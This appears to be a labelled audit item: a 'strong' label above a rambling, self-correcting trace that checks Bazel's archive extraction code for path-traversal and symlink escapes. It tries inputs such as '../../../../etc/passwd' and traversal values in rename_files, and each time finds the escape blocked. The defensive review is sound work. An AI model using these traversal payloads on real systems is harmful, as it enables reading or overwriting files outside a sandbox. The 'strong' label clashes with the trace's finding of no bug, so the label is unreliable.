[Label]
strong

[Why]
Bazel supports specifying a dictionary of `rename_files` in `http_archive` and `download_and_extract` which is applied before `strip_prefix`. In `CompressedTarFunction.java`, `CompressedFunction.java`, `ArFunction.java`, `SevenZDecompressor.java` and `ZipDecompressor.java` the logic looks up the raw entry name in the map, and if present, replaces the name with the supplied value. If the supplied value in `rename_files` contains directory traversals like `../`, then `PathFragment.create(renamedValue)` normalizes the traversal. The issue is that the `strippedRelativePath.isAbsolute()` and `filePath.startsWith(descriptor.destinationPath())` checks use the *normalized* path fragment which could be perfectly valid depending on how Bazel's Path normalization is implemented (which removes `..` if they do not go above the root). Wait... no.
Let me investigate what `PathFragment` does when created with `../foo`.
I checked: `UnixOsPathPolicy.removeRelativePaths` removes `..` if there's a parent, but if it reaches the root, it just leaves `..` for relative paths!

Wait, `PathFragment.create("../foo")` returns a PathFragment that contains `..` in it.
When computing `filePath = destinationDirectory.getRelative(strippedRelativePath)`, `getRelative` does `destinationDirectory.pathFragment.getRelative(strippedRelativePath)`. If `strippedRelativePath` contains `..`, then `PathFragment#getRelative` resolves the `..` against `destinationDirectory.pathFragment`. Because `destinationDirectory` is an absolute path (e.g. `/tmp/bazel-out/.../external/repo`), resolving `..` against it actually moves the path *up* in the directory tree, potentially outside of `destinationDirectory`.

Then, `filePath.startsWith(destinationDirectory)` is called.
Let's see what `Path.startsWith` does. It delegates to `PathFragment.startsWith`, which does string prefix matching on the *normalized* absolute paths.
If `destinationDirectory` is `/tmp/repo` and `filePath` is `/tmp/foo`, then `startsWith` returns false. So `path is escaping the destination directory` is thrown.
Wait, that is correct and safe. Let's see if there is any symlink bug.

In `CompressedTarFunction.java`:
```java
          if (entry.isSymbolicLink() || entry.isLink()) {
            PathFragment targetName =
                maybeDeprefixSymlink(
                    toRawBytesString(entry.getLinkName()).getBytes(ISO_8859_1),
                    prefix,
                    descriptor.destinationPath());

            Path resolvedTargetPath =
                (entry.isSymbolicLink()
                        ? filePath.getParentDirectory()
                        : descriptor.destinationPath())
                    .getRelative(targetName);
            if (!targetName.isAbsolute()
                && !resolvedTargetPath.startsWith(descriptor.destinationPath())) {
              throw new IOException(...);
            }
```
If `targetName.isAbsolute()` is TRUE, the check `!resolvedTargetPath.startsWith(...)` is SKIPPED!
Let's double check this: `!targetName.isAbsolute() && ...`. If it's absolute, it's NOT checked!
Then `symlinks.put(filePath, targetName);`
Then `FileSystemUtils.ensureSymbolicLink(linkPath, symlink.getValue());`
`ensureSymbolicLink` creates a symlink at `filePath` pointing to `targetName`.
Since `targetName` is absolute, it creates a symlink pointing to an absolute path on the system.

Is it a problem to extract an archive containing an absolute symlink?
Often no, but if an attacker can cause `download_and_extract` to fetch an archive with an absolute symlink, they create an absolute symlink in the repository directory. But wait, `http_archive` and `download_and_extract` just extract files. Creating an absolute symlink is normal for archives. The user running Bazel just gets a symlink. They can read it if they read the symlink. Does it cross a trust boundary?
However, `rename_files` in `http_archive` replaces the name with an arbitrary string.
If `rename_files = {"foo": "../../bar"}` is used, `maybeDeprefix` uses `createPathFragment`.
`ZipDecompressor.java` line 98:
```java
        extractZipEntry(
            reader, entry, destinationDirectory, entryPath.getPathFragment(), prefix, symlinks);
...
    Path outputPath = destinationDirectory.getRelative(strippedRelativePath);
    if (!outputPath.startsWith(destinationDirectory)) {
      throw new IOException(
          String.format(
              "Failed to extract %s, path is escaping the destination directory",
              strippedRelativePath));
    }
```
In `ZipDecompressor`, if `renameFiles` renames `foo` to `/root/bar` or `../../bar`, `outputPath.startsWith` will fail. So `rename_files` correctly checks path escaping.
Wait, what if `entryName` in `ZipDecompressor` is `../foo` and `renameFiles` renames it to `bar`? The map key must exactly match. If an attacker controls the zip file, they can put paths like `foo`.

Let's look at `maybeDeprefixSymlink`.
```java
  public static PathFragment maybeDeprefixSymlink(
      byte[] rawTarget, Optional<String> prefix, Path root) {
    boolean wasAbsolute = createPathFragment(rawTarget).isAbsolute();
    // Strip the prefix from the link path if set.
    PathFragment linkPathFragment = maybeDeprefix(rawTarget, prefix).getPathFragment();
    if (wasAbsolute) {
      // Recover the path to an absolute path as maybeDeprefix() relativize the path
      // even if the prefix is not set
      return root.getRelative(linkPathFragment).asFragment();
    }
    return linkPathFragment;
  }
```
If `rawTarget` is absolute (e.g. `/etc/passwd`), `createPathFragment(rawTarget).isAbsolute()` is true.
`maybeDeprefix(rawTarget, prefix)`:
```java
    PathFragment entryPath = relativize(entry); // entry is rawTarget. relativize turns absolute to relative.
    // e.g. /etc/passwd -> etc/passwd.
    if (prefix.isEmpty()) {
      return new StripPrefixedPath(entryPath, false, false);
    }
    ...
```
If `prefix` is empty, it returns `entryPath` (e.g. `etc/passwd`).
Then `maybeDeprefixSymlink` returns `root.getRelative(linkPathFragment).asFragment()`.
So `/etc/passwd` becomes `root.getRelative("etc/passwd").asFragment()`, which is `/tmp/bazel-out/external/repo/etc/passwd`!
So an absolute symlink in an archive is automatically converted to a relative symlink rooted at the destination directory!
Wait, if it becomes `/tmp/.../etc/passwd`, then `targetName.isAbsolute()` is TRUE (because it is an absolute path).
So in `CompressedTarFunction.java`:
```java
          if (entry.isSymbolicLink() || entry.isLink()) {
            PathFragment targetName =
                maybeDeprefixSymlink(
                    toRawBytesString(entry.getLinkName()).getBytes(ISO_8859_1),
                    prefix,
                    descriptor.destinationPath());

            Path resolvedTargetPath =
                (entry.isSymbolicLink()
                        ? filePath.getParentDirectory()
                        : descriptor.destinationPath())
                    .getRelative(targetName);
            if (!targetName.isAbsolute()
                && !resolvedTargetPath.startsWith(descriptor.destinationPath())) {
              throw new IOException(...);
            }
```
If `rawTarget` is `/etc/passwd`, `targetName` becomes `/tmp/bazel-out/external/repo/etc/passwd`.
`targetName.isAbsolute()` is true. So the security check is skipped!
Then `resolvedTargetPath` doesn't matter for the security check.
Then `symlinks.put(filePath, targetName)`.
Then `FileSystemUtils.ensureSymbolicLink(linkPath, symlink.getValue());`
`linkPath` is `filePath` (e.g. `/tmp/bazel-out/external/repo/link`).
`symlink.getValue()` is `/tmp/bazel-out/external/repo/etc/passwd`.
It creates a symlink pointing to `/tmp/bazel-out/external/repo/etc/passwd`.
Is there a problem here? No, the symlink points safely inside the repo.

Wait, what if `rawTarget` is `/../../etc/passwd`?
`createPathFragment("/../../etc/passwd").isAbsolute()` is true.
`relativize` turns it into `../../etc/passwd` (Wait, does it? `getRelative` or `create` normalizes absolute paths?)
Let's see what `relativize` does:
```java
  private static PathFragment relativize(byte[] path) {
    PathFragment entryPath = createPathFragment(path);
    if (entryPath.isAbsolute()) {
      entryPath = entryPath.toRelative();
    }
    return entryPath;
  }
```
`PathFragment.create("/../../etc/passwd")`.
In `UnixOsPathPolicy.removeRelativePaths`:
```java
          case "..":
            if (segmentCount > 0 && !segments[segmentCount - 1].equals("..")) {
              segmentCount--;
              shift += 2;
              break;
            } else if (isAbsolute) {
              // If this is absolute, then just pop it the ".." off and remain at root
              ++shift;
              break;
            }
```
Ah! If `isAbsolute` is true, `..` is popped off!
So `/../../etc/passwd` normalizes to `/etc/passwd`.
Then `entryPath.toRelative()` makes it `etc/passwd`.
So it still safely points to `root/etc/passwd`.
Wait, what if `entryName` in `ZipDecompressor` is `foo` and `renameFiles` renames it to `../bar`?
`entryName` = `../bar`.
`entryPath.getPathFragment()` becomes `../bar`.
Then `outputPath = destinationDirectory.getRelative(entryPath.getPathFragment())`.
If `destinationDirectory` is `/tmp/bazel/external/repo`, `getRelative("../bar")` returns `/tmp/bazel/external/bar`.
Then `outputPath.startsWith(destinationDirectory)`:
`/tmp/bazel/external/bar` starts with `/tmp/bazel/external/repo`? False.
So it correctly throws `IOException("Failed to extract ../bar, path is escaping the destination directory")`.

Wait... is there any bug in `CompressedFunction.java` or `Bz2Function.java` or `GzFunction.java`?
`CompressedFunction.java`:
```java
      String entryName =
          getUncompressedFileName(decompressorStream, descriptor.archivePath().getBaseName());
      entryName = renameFiles.getOrDefault(entryName, entryName);
      PathFragment entryPathRelative = PathFragment.create(entryName);
      if (entryPathRelative.isAbsolute()) {
        throw new IOException(
            String.format("Failed to extract %s, paths cannot be absolute", entryName));
      }
      Path filePath = descriptor.destinationPath().getRelative(entryPathRelative);
      if (!filePath.startsWith(descriptor.destinationPath())) {
        throw new IOException(
            String.format(
                "Failed to extract %s, path is escaping the destination directory", entryName));
      }
```
If `renameFiles` maps `file.txt` to `../bar.txt`, `filePath.startsWith` fails.

What about `ArFunction.java`?
```java
        String entryName = entry.getName();
        entryName = renameFiles.getOrDefault(entryName, entryName);
        PathFragment entryPathRelative = PathFragment.create(entryName);
        if (entryPathRelative.isAbsolute()) {
          throw new IOException(
              String.format("Failed to extract %s, ar paths cannot be absolute", entryName));
        }
        Path filePath = descriptor.destinationPath().getRelative(entryPathRelative);
        if (!filePath.startsWith(descriptor.destinationPath())) {
          throw new IOException(
              String.format(
                  "Failed to extract %s, path is escaping the destination directory", entryName));
        }
```
Same correct logic.

What about `renameFiles` mapping to an absolute path like `/etc/passwd`?
In all functions: `entryPath.isAbsolute()` throws `IOException`.

What about `PatchUtil.java`? Does it extract?
```java
  public static void apply(Path patchFile, int strip, Path outputDirectory)
```
In `PatchUtil.java`, `extractPath` parses `--- a/foo/bar.txt` into `foo/bar.txt`.
Then `oldFile = outputDirectory.getRelative(oldFileStr);`
Wait... does `PatchUtil` check if `oldFile.startsWith(outputDirectory)`?
Wait, `getFilePath` does:
```java
    Path filePath = outputDirectory.getRelative(path);
    if (!filePath.startsWith(outputDirectory)) {
      throw ...
```
Is `path` a `String` or `PathFragment`?
```java
  private static Path getFilePath(String path, Path outputDirectory, int loc)
```
If `path` is an absolute string like `"/etc/passwd"`, `outputDirectory.getRelative("/etc/passwd")` returns `"/etc/passwd"`.
Then `filePath.startsWith(outputDirectory)`:
`"/etc/passwd".startsWith("/tmp/...")` is false.
So it throws correctly!

Is there any bug in `PatchUtil.java`?
If `path` is `"../bar.txt"`, `outputDirectory.getRelative("../bar.txt")` is `/tmp/.../repo/../bar.txt` -> `/tmp/.../bar.txt`.
Then `startsWith` fails.

Let's go back to `CompressedTarFunction.java`.
```java
          if (entry.isSymbolicLink() || entry.isLink()) {
            PathFragment targetName =
                maybeDeprefixSymlink(
                    toRawBytesString(entry.getLinkName()).getBytes(ISO_8859_1),
                    prefix,
                    descriptor.destinationPath());

            Path resolvedTargetPath =
                (entry.isSymbolicLink()
                        ? filePath.getParentDirectory()
                        : descriptor.destinationPath())
                    .getRelative(targetName);
            if (!targetName.isAbsolute()
                && !resolvedTargetPath.startsWith(descriptor.destinationPath())) {
              throw new IOException(
                  String.format(
                      "Tar entries cannot refer to files outside of their directory: %s has a"
                          + " link %s pointing to %s",
                      descriptor.archivePath(), entryName, targetName));
            }
```
If `rawTarget` is `/etc/passwd`.
`maybeDeprefixSymlink` returns a relative `PathFragment`: `root.getRelative(linkPathFragment).asFragment()`. Wait, NO!
If `wasAbsolute` is true:
```java
    if (wasAbsolute) {
      // Recover the path to an absolute path as maybeDeprefix() relativize the path
      // even if the prefix is not set
      return root.getRelative(linkPathFragment).asFragment();
    }
```
`linkPathFragment` is `etc/passwd`.
`root.getRelative("etc/passwd").asFragment()` returns `/tmp/bazel/external/repo/etc/passwd`.
So `targetName` becomes an ABSOLUTE PathFragment pointing INSIDE the repo.
Because `targetName.isAbsolute()` is TRUE, the check `!resolvedTargetPath.startsWith(...)` is SKIPPED.
Then `symlinks.put(filePath, targetName)`.
The symlink points to `/tmp/bazel/external/repo/etc/passwd`. This is perfectly safe! It doesn't escape the repo!

What if `rawTarget` is `/../../etc/passwd`?
Then `createPathFragment("/../../etc/passwd").isAbsolute()` is true.
`maybeDeprefix` processes `"/../../etc/passwd"`.
In `maybeDeprefix`: `relativize("/../../etc/passwd")`.
`createPathFragment("/../../etc/passwd")` creates an absolute path fragment `"/etc/passwd"`.
Wait, `UnixOsPathPolicy.removeRelativePaths` handles `/../../etc/passwd`.
`isAbsolute` is true. `segmentCount = 0`, so `..` just shifts!
So `/../../etc/passwd` becomes `/etc/passwd`!
Then `entryPath.toRelative()` becomes `etc/passwd`.
Then `maybeDeprefixSymlink` does `root.getRelative("etc/passwd").asFragment()`, which is `/tmp/bazel/external/repo/etc/passwd`.
So the symlink still points inside the repo!

So absolute paths in symlinks are safely transformed to point inside the repo root!
Wait! What if `targetName` is RELATIVE?
If `rawTarget` is `../../../../etc/passwd`.
`createPathFragment("../../../../etc/passwd").isAbsolute()` is FALSE.
`maybeDeprefix` returns `../../../../etc/passwd`.
`wasAbsolute` is FALSE, so `maybeDeprefixSymlink` returns `../../../../etc/passwd` as a relative `PathFragment`.
So `targetName` is `../../../../etc/passwd`.
Then `targetName.isAbsolute()` is FALSE.
Then `resolvedTargetPath = filePath.getParentDirectory().getRelative("../../../../etc/passwd")`.
Because it escapes `descriptor.destinationPath()`, `!resolvedTargetPath.startsWith(descriptor.destinationPath())` evaluates to TRUE!
So it throws `IOException`!
So directory traversal in relative symlinks is properly caught!

So there is NO BUG in `CompressedTarFunction.java`.
Wait, what if `rename_files` modifies `entryName` in `CompressedTarFunction`?
```java
        String entryName = toRawBytesString(entry.getName());
        entryName = renameFiles.getOrDefault(entryName, entryName);
        StripPrefixedPath entryPath =
            StripPrefixedPath.maybeDeprefix(entryName.getBytes(ISO_8859_1), prefix);
        ...
        PathFragment strippedRelativePath = entryPath.getPathFragment();
        if (strippedRelativePath.isAbsolute()) {
          throw new IOException(
              String.format(
                  "Failed to extract %s, tarred paths cannot be absolute", strippedRelativePath));
        }

        Path filePath = descriptor.destinationPath().getRelative(strippedRelativePath);
        if (!filePath.startsWith(descriptor.destinationPath())) {
          throw new IOException(
              String.format(
                  "Failed to extract %s, path is escaping the destination directory",
                  strippedRelativePath));
        }
```
If `renameFiles` sets `entryName = "../../bar"`, `maybeDeprefix` makes `entryPath` = `../../bar`.
Then `strippedRelativePath` is `../../bar`.
`strippedRelativePath.isAbsolute()` is false.
`filePath = descriptor.destinationPath().getRelative("../../bar")`.
It resolves to `/tmp/bazel/bar` (if `destinationPath` is `/tmp/bazel/repo`).
Then `filePath.startsWith(descriptor.destinationPath())` is FALSE.
So it throws `IOException`.

Wait! What if `renameFiles` renames to `bar/../../../../etc/passwd`?
Same, `getRelative` resolves it and `startsWith` catches it.

Is there any bug here?
Wait, what if `entryName` in `ZipDecompressor` is `../foo` and `renameFiles` renames it to `../foo`?
`renameFiles` allows replacing keys with values.
```java
        entryName = renameFiles.getOrDefault(entryName, entryName);
```
What if an attacker uses `strip_prefix`?
```java
        StripPrefixedPath entryPath =
            StripPrefixedPath.maybeDeprefix(entryName.getBytes(ISO_8859_1), prefix);
```
If `prefix` is `foo/`, `entryName` is `foo/../../bar`.
`entryPath` will become `../../bar`.
Then `filePath` escapes the destination directory.
It throws `IOException`!

Wait!
In `StripPrefixedPath.java`:
```java
  public static StripPrefixedPath maybeDeprefix(byte[] entry, Optional<String> prefix) {
    Preconditions.checkNotNull(entry);
    PathFragment entryPath = relativize(entry);
    if (prefix.isEmpty()) {
      return new StripPrefixedPath(entryPath, false, false);
    }

    // Bazel parses Starlark files, which are the ultimate source of prefixes, as Latin-1
    // (ISO-8859-1).
    PathFragment prefixPath = relativize(prefix.get().getBytes(ISO_8859_1));
    boolean found = false;
    boolean skip = false;
    if (entryPath.startsWith(prefixPath)) {
      found = true;
      entryPath = entryPath.relativeTo(prefixPath);
      if (entryPath.getPathString().isEmpty()) {
        skip = true;
      }
    } else {
      skip = true;
    }
    return new StripPrefixedPath(entryPath, found, skip);
  }
```
If `entryName` is `foo/../../bar`, `entryPath` becomes `foo/../../bar` which is `../bar`.
If `prefixPath` is `foo`, `entryPath.startsWith(prefixPath)`:
`../bar`.startsWith(`foo`) is FALSE.
So `skip = true`.
So the file is skipped!

Wait, what if `prefix` is `..`?
`prefixPath` becomes `..`.
`entryName` is `../../bar`.
`entryPath` becomes `../../bar`.
`entryPath.startsWith(prefixPath)`:
`../../bar` starts with `..`?
`PathFragment` `startsWith`:
`"../.."` starts with `".."`?
Yes!
Then `entryPath = entryPath.relativeTo(prefixPath)`.
`"../../bar".relativeTo("..")` returns `../bar`.
Then `skip = false`.
Then `strippedRelativePath` is `../bar`.
Then it throws `IOException` in the next check.

Is there any bug in `isAbsolute` check?
If `entryName` is `/foo` and `prefix` is `/foo`.
`relativize` turns `entryName` into `foo`.
`prefixPath` is `foo`.
`entryPath.startsWith(prefixPath)` is true.
`entryPath` becomes ``. `skip = true`.

What if we pass an absolute path in `renameFiles`?
```java
    Map<String, String> renameFiles = descriptor.renameFiles();
        entryName = renameFiles.getOrDefault(entryName, entryName);
```
If `renameFiles` is `{"a": "/etc/passwd"}`, `entryName` becomes `/etc/passwd`.
Then `maybeDeprefix` calls `relativize("/etc/passwd")`.
`relativize` makes it `etc/passwd`.
Wait! `relativize` makes it `etc/passwd`!
```java
  private static PathFragment relativize(byte[] path) {
    PathFragment entryPath = createPathFragment(path);
    if (entryPath.isAbsolute()) {
      entryPath = entryPath.toRelative();
    }
    return entryPath;
  }
```
So an absolute path in `renameFiles` is SILENTLY transformed into a relative path!
So `/etc/passwd` becomes `etc/passwd` and is extracted safely inside the repo directory!
Wait, but what if `renameFiles` is `{"a": "/../../etc/passwd"}`?
`createPathFragment("/../../etc/passwd").toRelative()` returns `etc/passwd`.
So it safely extracts inside the repo!
What about `CompressedFunction.java`? It DOES NOT USE `StripPrefixedPath`!
```java
    ImmutableMap<String, String> renameFiles = descriptor.renameFiles();
    try (InputStream decompressorStream =
        getDecompressorStream(
            new BufferedInputStream(descriptor.archivePath().getInputStream(), BUFFER_SIZE))) {
      String entryName =
          getUncompressedFileName(decompressorStream, descriptor.archivePath().getBaseName());
      entryName = renameFiles.getOrDefault(entryName, entryName);
      PathFragment entryPathRelative = PathFragment.create(entryName);
      if (entryPathRelative.isAbsolute()) {
        throw new IOException(
            String.format("Failed to extract %s, paths cannot be absolute", entryName));
      }
      Path filePath = descriptor.destinationPath().getRelative(entryPathRelative);
```
Wait! `renameFiles.getOrDefault(entryName, entryName)`
If `renameFiles` maps the base name to `/etc/passwd`.
`entryPathRelative` is `PathFragment.create("/etc/passwd")`.
`entryPathRelative.isAbsolute()` is TRUE.
So it throws `IOException`.

What if `renameFiles` maps to `../../../../../../etc/passwd`?
`entryPathRelative.isAbsolute()` is FALSE.
`filePath = descriptor.destinationPath().getRelative("../../../../../../etc/passwd")`.
`filePath` becomes `/etc/passwd` (if destination is deep enough).
Then `filePath.startsWith(descriptor.destinationPath())` is FALSE.
So it throws `IOException`.

Wait, what if `entryName` in the archive is `../../etc/passwd`?
The `getUncompressedFileName` just takes the `getBaseName()` of the archive path.
Wait, `archivePath.getBaseName()` is the base name of the downloaded file. e.g. `foo.tar.gz`.
Then `entryName` is `foo.tar`.
Then `renameFiles` maps `foo.tar` to `../../etc/passwd`.
Then `startsWith` catches it.

Is there any bug in `CompressedFunction.java`?
If `entryName` is `foo.tar`, `renameFiles` can change it. But all traversal or absolute paths are caught.
What about `ZipDecompressor.java` when dealing with symlinks?
```java
      PathFragment target = StripPrefixedPath.createPathFragment(buffer);
      Path targetPath = outputPath.getParentDirectory().getRelative(target);
      if (!target.isAbsolute() && !targetPath.startsWith(destinationDirectory)) {
        throw new IOException(
            "Zip entries cannot refer to files outside of their directory: "
                + reader.getFilename()
                + " has a symlink "
                + strippedRelativePath
                + " pointing to "
                + new String(buffer, UTF_8));
      }

      symlinks.put(outputPath, maybeDeprefixSymlink(buffer, prefix, destinationDirectory));
```
`target` is `StripPrefixedPath.createPathFragment(buffer)`.
If `buffer` is `/etc/passwd`.
`target.isAbsolute()` is TRUE.
Then the check `!targetPath.startsWith(destinationDirectory)` is SKIPPED!
Then `symlinks.put(outputPath, maybeDeprefixSymlink(buffer, prefix, destinationDirectory));`
`maybeDeprefixSymlink` returns an absolute path if `wasAbsolute` is TRUE?
```java
    boolean wasAbsolute = createPathFragment(rawTarget).isAbsolute();
    // Strip the prefix from the link path if set.
    PathFragment linkPathFragment = maybeDeprefix(rawTarget, prefix).getPathFragment();
    if (wasAbsolute) {
      // Recover the path to an absolute path as maybeDeprefix() relativize the path
      // even if the prefix is not set
      return root.getRelative(linkPathFragment).asFragment();
    }
```
If `wasAbsolute` is TRUE (e.g., `/etc/passwd`), `linkPathFragment` is `etc/passwd`.
Then `root.getRelative(linkPathFragment).asFragment()` returns `/tmp/.../external/repo/etc/passwd`!
So `maybeDeprefixSymlink` creates a symlink pointing to an absolute path *inside the repo directory*.
This means the symlink is completely safe! It doesn't point to `/etc/passwd`, it points to the repo's copy!

Wait! Does `UnixOsPathPolicy.removeRelativePaths` make `/../../etc/passwd` safe?
Yes, it transforms it to `/etc/passwd`. Then `relativize` turns it into `etc/passwd`. Then `root.getRelative` adds the repo root.
So `/../../etc/passwd` becomes `/tmp/.../external/repo/etc/passwd`.
So there's no way to create a symlink pointing OUTSIDE the repo!
What about `ZipDecompressorTest.java`?
If `renameFiles` is used to bypass path escaping...
Wait, what if `StripPrefixedPath.maybeDeprefix` skips files that escape?
```java
    PathFragment prefixPath = relativize(prefix.get().getBytes(ISO_8859_1));
    boolean found = false;
    boolean skip = false;
    if (entryPath.startsWith(prefixPath)) {
      found = true;
      entryPath = entryPath.relativeTo(prefixPath);
      if (entryPath.getPathString().isEmpty()) {
        skip = true;
      }
    } else {
      skip = true;
    }
```
If `prefix` is present, and `entryPath` DOES NOT start with `prefixPath`, `skip = true`.
If `prefix` is empty:
```java
    if (prefix.isEmpty()) {
      return new StripPrefixedPath(entryPath, false, false);
    }
```
If `prefix` is empty, `skip` is false.
Then `entryPath` is returned.
If `entryName` is `../../bar`, `entryPath` is `../../bar`.
Then `skip` is false.
Then `strippedRelativePath` is `../../bar`.
Then `destinationDirectory.getRelative("../../bar")` is called.
Then `outputPath.startsWith(destinationDirectory)` fails!
So it throws `IOException`.
So there's NO directory traversal using relative paths or absolute paths in archive extraction.

Is there any OTHER way?
What if `entryName` is `\..\..\foo` and it runs on Linux?
`UnixOsPathPolicy.isSeparator` only checks for `/`.
If `entryName` is `\..\..\foo` on Linux, `removeRelativePaths` does NOT recognize `\` as a separator.
So `entryPath` is `\..\..\foo`.
Then `getRelative("\..\..\foo")` appends `\..\..\foo` to `destinationDirectory`.
So `outputPath` is `/tmp/.../repo/\..\..\foo`.
Is `\..\..\foo` a valid filename on Linux? Yes.
Does it escape the directory? No.
So it's safely extracted into a file named `\..\..\foo`.

What if it runs on Windows?
`WindowsOsPathPolicy.isSeparator` checks for `\` and `/`.
Then `needsToNormalize` detects `\`, so it replaces `\` with `/`.
Then `removeRelativePaths` removes `..`.
So it safely normalizes and catches traversal on Windows too.
Wait, what if `entryName` in `ZipDecompressor` is `.foo` and `prefix` is `.foo`?
`found = true; entryPath = ""; skip = true;`
What if the attacker provides `rename_files` that maps the original path to a symlink's target?
The `rename_files` applies to the filename before extraction.
Is there any chance of a bug where `maybeDeprefix` uses `entryPath.relativeTo` and it resolves something wrong?
`entryPath.relativeTo(prefixPath)` uses `PathFragment.relativeTo()`.
If `prefixPath` is `foo` and `entryPath` is `foo/bar`, it returns `bar`.
It checks if `entryPath` starts with `prefixPath`.

What about `StripPrefixedPath.java`'s handling of Windows drives?
If `entryName` is `C:/etc/passwd`, `relativize` turns it into `etc/passwd` because `isAbsolute` is true.

What about `SymlinkTargetType`? Wait, `isSymlink()` or `isLink()` in Tar.
If `entry.isLink()` is true, it is a hard link.
```java
                if (filePath.exists()) {
                  filePath.delete();
                }
                FileSystemUtils.createHardLink(filePath, resolvedTargetPath);
```
`resolvedTargetPath` is:
```java
            Path resolvedTargetPath =
                (entry.isSymbolicLink()
                        ? filePath.getParentDirectory()
                        : descriptor.destinationPath())
                    .getRelative(targetName);
```
Wait! `entry.isLink()` means hard link.
For hard links, `resolvedTargetPath` is `descriptor.destinationPath().getRelative(targetName)`.
And `targetName` is computed via `maybeDeprefixSymlink`.
`maybeDeprefixSymlink` returns an absolute path if `rawTarget` was absolute (e.g. `/etc/passwd`).
Then `maybeDeprefixSymlink` returns `root.getRelative("etc/passwd").asFragment()`, which is `/tmp/.../repo/etc/passwd`.
Wait, NO!
```java
  public static PathFragment maybeDeprefixSymlink(
      byte[] rawTarget, Optional<String> prefix, Path root) {
    boolean wasAbsolute = createPathFragment(rawTarget).isAbsolute();
    // Strip the prefix from the link path if set.
    PathFragment linkPathFragment = maybeDeprefix(rawTarget, prefix).getPathFragment();
    if (wasAbsolute) {
      // Recover the path to an absolute path as maybeDeprefix() relativize the path
      // even if the prefix is not set
      return root.getRelative(linkPathFragment).asFragment();
    }
    return linkPathFragment;
  }
```
`root` is passed as `descriptor.destinationPath()`.
If `rawTarget` is absolute `/etc/passwd`, `maybeDeprefixSymlink` returns an absolute `PathFragment` like `/tmp/bazel/repo/etc/passwd`.
Then `resolvedTargetPath = descriptor.destinationPath().getRelative(targetName)`.
If `targetName` is absolute `/tmp/bazel/repo/etc/passwd`, `getRelative` ignores `descriptor.destinationPath()` and just returns `/tmp/bazel/repo/etc/passwd`.
Then `FileSystemUtils.createHardLink(filePath, resolvedTargetPath)` is called.
`filePath` is inside the repo. `resolvedTargetPath` is inside the repo.
It creates a hard link to `/tmp/bazel/repo/etc/passwd`. Safe!

What if `rawTarget` is `../../../../etc/passwd` (a relative path)?
`wasAbsolute` is false.
`maybeDeprefix` returns `../../../../etc/passwd`.
`targetName` is `../../../../etc/passwd`.
`targetName.isAbsolute()` is false.
`resolvedTargetPath` is `descriptor.destinationPath().getRelative("../../../../etc/passwd")`.
It escapes the `destinationPath`!
BUT:
```java
            if (!targetName.isAbsolute()
                && !resolvedTargetPath.startsWith(descriptor.destinationPath())) {
              throw new IOException(...);
            }
```
Since `targetName.isAbsolute()` is false, the check evaluates to `!resolvedTargetPath.startsWith(descriptor.destinationPath())`.
Since it escapes, `startsWith` returns false.
So it throws `IOException`! Safe!

Is there any race condition?
`FileSystemUtils.createHardLink(filePath, resolvedTargetPath);`
If `resolvedTargetPath` is modified between the check and `createHardLink`?
It is extracted from an archive sequentially.

Wait, what if `rawTarget` is `../foo`?
`resolvedTargetPath` = `descriptor.destinationPath().getRelative("../foo")`.
If `destinationPath` is `/tmp/repo`, `resolvedTargetPath` is `/tmp/foo`.
It escapes, and `startsWith` throws `IOException`.

What if `rawTarget` is `foo`?
`resolvedTargetPath` = `descriptor.destinationPath().getRelative("foo")`.
It is `/tmp/repo/foo`.
`startsWith` returns true.
It creates a hard link from `/tmp/repo/filePath` to `/tmp/repo/foo`.
Safe.

So the decompressors are fully protected against directory traversal.
Wait! Is `isSymlink()` and `isLink()` using `descriptor.destinationPath()` instead of `filePath.getParentDirectory()`?
```java
            Path resolvedTargetPath =
                (entry.isSymbolicLink()
                        ? filePath.getParentDirectory()
                        : descriptor.destinationPath())
                    .getRelative(targetName);
```
Yes! For `isLink()` it uses `descriptor.destinationPath()`.
Because Tar hard links are relative to the ROOT of the archive.
For `isSymbolicLink()` it uses `filePath.getParentDirectory()`.
Because symlinks are relative to their own location.
This is exactly correct.

So `CompressedTarFunction` is safe.
What about `ZipDecompressor`?
```java
      PathFragment target = StripPrefixedPath.createPathFragment(buffer);
      Path targetPath = outputPath.getParentDirectory().getRelative(target);
      if (!target.isAbsolute() && !targetPath.startsWith(destinationDirectory)) {
        throw new IOException(
            "Zip entries cannot refer to files outside of their directory: "
                + reader.getFilename()
                + " has a symlink "
                + strippedRelativePath
                + " pointing to "
                + new String(buffer, UTF_8));
      }

      symlinks.put(outputPath, maybeDeprefixSymlink(buffer, prefix, destinationDirectory));
```
If `buffer` is absolute, e.g. `/etc/passwd`.
`target.isAbsolute()` is true.
It skips `!targetPath.startsWith`.
`symlinks.put(outputPath, maybeDeprefixSymlink(buffer, prefix, destinationDirectory));`
`maybeDeprefixSymlink` returns an absolute path rooted at `destinationDirectory`.
So the symlink points inside the repo.
Safe.

If `buffer` is relative, e.g. `../../etc/passwd`.
`target.isAbsolute()` is false.
`targetPath = outputPath.getParentDirectory().getRelative("../../etc/passwd");`
If it escapes, `!targetPath.startsWith` is true, so it throws `IOException`.
Safe.

So decompression seems completely safe.
Is there anything else?
Wait, what if `StripPrefixedPath.maybeDeprefix` on a ZIP or TAR entry has a flaw when `renameFiles` modifies the `entryName` to a relative path that breaks `StripPrefixedPath`?
`renameFiles` applies BEFORE `maybeDeprefix`.
If `renameFiles` renames `foo` to `../bar`, `entryName` is `../bar`.
`maybeDeprefix` calls `relativize("../bar")`.
`PathFragment.create("../bar")` is a relative path.
`relativize` returns `../bar`.
If `prefix` is empty, `maybeDeprefix` returns `new StripPrefixedPath("../bar", false, false)`.
Then `strippedRelativePath` is `../bar`.
Then `outputPath = destinationDirectory.getRelative("../bar")`.
`outputPath` is evaluated against `destinationDirectory`.
If `destinationDirectory` is `/tmp/repo`, `outputPath` is `/tmp/bar`.
Then `!outputPath.startsWith(destinationDirectory)` is TRUE.
It throws `IOException`.

What if `renameFiles` renames `foo` to `/tmp/bar`?
`entryName` is `/tmp/bar`.
`relativize("/tmp/bar")` makes it `tmp/bar` (absolute path converted to relative).
If `prefix` is empty, `maybeDeprefix` returns `new StripPrefixedPath("tmp/bar", false, false)`.
Then `strippedRelativePath` is `tmp/bar`.
Then `outputPath` is `/tmp/repo/tmp/bar`.
Then `!outputPath.startsWith(destinationDirectory)` is FALSE.
It safely extracts to `/tmp/repo/tmp/bar`.

What if `renameFiles` renames `foo` to `../repo/bar`?
`entryName` is `../repo/bar`.
`relativize("../repo/bar")` returns `../repo/bar`.
`maybeDeprefix` returns `../repo/bar`.
`outputPath` is `/tmp/repo/../repo/bar` -> `/tmp/repo/bar`.
Then `!outputPath.startsWith(destinationDirectory)` is FALSE.
It extracts to `/tmp/repo/bar`.
